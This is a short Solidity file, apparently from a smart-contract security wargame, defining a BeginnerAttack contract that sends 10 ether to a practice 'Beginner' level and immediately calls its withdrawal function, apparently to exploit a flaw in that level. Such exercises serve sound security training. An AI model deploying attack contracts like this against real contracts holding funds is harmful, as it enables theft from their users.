pragma solidity ^0.5.8;

import '../levels/Beginner.sol';

contract BeginnerAttack {
  function attack(address _target) public payable {
    Beginner beginner = Beginner(_target);
    beginner.sendMoneeey.value(10 ether)();
    beginner.getMyMoneeeyBack();
  }
}
